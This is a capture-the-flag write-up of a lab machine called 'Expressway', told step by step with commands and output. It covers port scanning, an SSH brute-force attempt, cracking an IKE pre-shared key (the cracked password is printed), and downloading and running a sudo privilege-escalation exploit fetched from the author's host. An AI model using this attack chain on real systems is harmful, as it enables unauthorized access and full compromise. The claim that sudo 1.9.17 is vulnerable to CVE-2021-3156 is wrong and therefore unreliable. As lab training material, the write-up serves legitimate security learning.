
I began by performing a full `TCP` port scan using `Nmap` to identify open services on the target and found only a single open port `22/tcp`.

```
$ IP=10.10.11.87
ports=$(sudo nmap -Pn -sS -p- -T4 ${IP} | grep -E '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
sudo nmap -p${ports} -sC -sV ${IP}
[...]
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:36 +07
Nmap scan report for 10.10.11.87
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds
```

I used Nmap’s `ssh-auth-methods` script to identify potential attack vectors. The SSH service supported both `publickey` and `password` authentication.

```
$ sudo nmap --script ssh-auth-methods -p 22 10.10.11.87 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:39 +07
Nmap scan report for 10.10.11.87
Host is up (0.77s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password

Nmap done: 1 IP address (1 host up) scanned in 3.39 seconds
```

I searched for known vulnerabilities in `OpenSSH 10.0p2` using `searchsploit`. However, no public exploits were found, suggesting the SSH version was not immediately vulnerable to known attacks.

```
$ searchsploit OpenSSH 10.0p2 Debian 8
Exploits: No Results
Shellcodes: No Results
```

Given the support for password authentication, I attempted a brute force attack using Nmap’s `ssh-brute` script. After 124 attempts, no valid credentials were found.

```
$ sudo nmap --script ssh-brute -p 22 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:46 +07
NSE: [ssh-brute] Trying username/password pair: root:root
NSE: [ssh-brute] Trying username/password pair: admin:admin
[...]
Nmap scan report for 10.10.11.87
Host is up (0.045s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 124 guesses in 617 seconds, average tps: 0.2

Nmap done: 1 IP address (1 host up) scanned in 617.04 seconds
```

To explore additional services, I conducted a `UDP` port scan and found an open `UDP` port `500` running `ISAKMP (IKE)`, typically associated with VPN services.

```
$ sudo nmap -sU 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 08:01 +07
[...]
Nmap scan report for 10.10.11.87
Host is up (0.20s latency).
Not shown: 967 closed udp ports (port-unreach), 29 filtered udp ports (host-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1068.84 seconds


$ sudo nmap -sU -p 500 --script ike-version 10.10.11.87
[...]
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 08:21 +07
Nmap scan report for 10.10.11.87
Host is up (0.089s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

I used `ike-scan` to force an Aggressive Mode handshake and enumerate `IKE` attributes. 

The response leaked sensitive information, including the identifier `ike@expressway.htb` and supported attributes like `XAUTH` and `Dead Peer Detection v1.0`

```
$ ike-scan -M -A 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=f3774d556cb14e1e)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.101 seconds (9.92 hosts/sec).  1 returned handshake; 0 returned notify
```

I captured an IKE Aggressive Mode handshake to extract parameters for a PSK attack, the handshake was exported, providing key parameters for cracking.

```
$ ike-scan -A --pskcrack 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=602d0c54271aad7b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
8c7d3ba67506fa4255f983cea15bc5c96ab6a4c0b9e59e878447637fd376e3d920daf0400a9aa2382c736e8142a92a640577688b9a1723cacfa92d64511f29eb9d675c09e20f051c34926f2d9a1795af902a9c2a9a069d68d622d515fa8aa45098c3c43968c204fd687542985359eb0132723df231ac380aa3d44d489fb5266c:c0dc8bd6d105c5fd08d6fd7b338a398e818273b2572d99083240383634b931a77f9d5bf75f5648cb9ee70640d9491051d2261909acf353c25e5142803bb90782957fe6a64e7b6aea1f6333931ea08d65cef41fb00a1700a5bea800d4e00e376707f57640aebc94bb13a61ea34dcd1b5c4dc4d77ebb1fcfb5e0295298899666e4:602d0c54271aad7b:eb7a518e0cea6825:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:e5f4fda50afdb3ceb8e1a8a6528114b9d6da5dc4:5446e6a603383f2bd5833dd4cc62caa2b974cf59a02b55a52c2145834068b9c0:5fec442cb346155c9e595c3cd30fb7d761705453
Ending ike-scan 1.9.6: 1 hosts scanned in 0.169 seconds (5.90 hosts/sec).  1 returned handshake; 0 returned notify
```

Next, I using `psk-crack` with the `rockyou.txt` dictionary and successfully cracked the PSK. The key `freakingrockstarontheroad` matched the SHA1 hash.

```
$ psk-crack --dictionary=/usr/share/seclists/rockyou.txt hashfile.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 5fec442cb346155c9e595c3cd30fb7d761705453
Ending psk-crack: 8045039 iterations in 4.096 seconds (1964021.11 iterations/sec)
```

I tested the credentials via SSH, the login was successful, granting access to the user account `ike`.

```
$ ssh ike@10.10.11.87                                                
ike@10.10.11.87's password: 
Last login: Mon Sep 22 19:06:20 BST 2025 from 10.10.14.163 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 22 19:32:34 2025 from 10.10.XX.XXX
ike@expressway:~$
```

I directory enumeration revealed the `g!user.txt` flag:

```
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ whoami
ike
ike@expressway:~$ pwd
/home/ike
ike@expressway:~$ ls -lha
total 32K
[...]
-rw-r----- 1 root ike    33 Sep 22 19:05 user.txt
ike@expressway:~$ cat user.txt
5785[...]34a4
```

Next, to `escalate privileges`, I checked for `sudo` `permissions` and `version`. 

The sudo version `r!1.9.17` was vulnerable to `CVE-2021-3156`, a known privilege escalation vulnerability.

```
ike@expressway:/tmp/.r3z$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.

ike@expressway:/tmp/.r3z$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

I downloaded a public exploit script for `CVE-2021-3156`:

<b>URL:</b> https://www.exploit-db.com/exploits/52352
{img3}

```
ike@expressway:/tmp/.r3z$ wget http://10.10.XX.XXX/52352.txt
--2025-09-24 14:25:05--  http://10.10.XX.XXX/52352.txt
Connecting to 10.10.XX.XXX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1104 (1.1K) [text/plain]
Saving to: ‘52352.txt’

52352.txt               100%[===============================>]   1.08K  --.-KB/s    in 0s      

2025-09-24 14:25:05 (138 MB/s) - ‘52352.txt’ saved [1104/1104]

ike@expressway:/tmp/.r3z$ rm 52352.sh 
ike@expressway:/tmp/.r3z$ ls
52352.txt
ike@expressway:/tmp/.r3z$ mv 52352.txt 52352.sh
ike@expressway:/tmp/.r3z$ ./52352.sh 
-bash: ./52352.sh: Permission denied
ike@expressway:/tmp/.r3z$ chmod +x 52352.sh 
ike@expressway:/tmp/.r3z$ ./52352.sh 
-bash: ./52352.sh: /bin/bash^M: bad interpreter: No such file or directory
```

The script initially failed due to incorrect line endings. I fixed this using `dos2unix`:

```
$ sudo apt install dos2unix
$ dos2unix 52352.sh             
dos2unix: converting file 52352.sh to Unix format...
```

I then executed the exploit and the exploit successfully escalated privileges to `r!root`.

```
ike@expressway:/tmp/.r3z$ ./52352.sh 
[*] Running exploit…
root@expressway:/#
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

As root, I accessed the /root directory and retrieved the `g!root.txt` flag:

```
root@expressway:/# ls -lha /root
total 44K
[...]
-rw-r-----  1 root root   33 Sep 24 14:20 root.txt
root@expressway:/# cat /root/root.txt
bdfd[...]b803
```

By leveraging an `IKE` Aggressive Mode handshake to obtain credentials and exploiting a sudo vulnerability (`CVE-2021-3156`), I gained root access to the target system. This demonstrated critical misconfigurations in the IKE service and an unpatched sudo vulnerability, both of which could allow unauthorized access and full system compromise.

{img4}
